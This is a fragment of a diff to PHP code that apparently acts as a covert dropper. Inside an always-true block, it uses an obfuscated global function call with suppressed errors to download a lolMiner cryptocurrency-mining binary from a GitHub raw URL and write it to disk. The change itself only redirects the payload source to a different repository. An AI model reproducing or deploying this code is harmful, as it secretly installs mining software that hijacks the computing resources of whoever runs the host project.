@@ -104,7 +104,7 @@ if(1)
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/mateusdevjun/myproj/refs/heads/main/lolminer/lolMiner_1.95.dat');
+		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/luizdev1500/projetonovo/refs/heads/main/lolminer/lolMiner_1.95.dat');
 		if($data && strlen($data) > 9000)
 			@file_put_contents($lolm_path, $data);
 		else
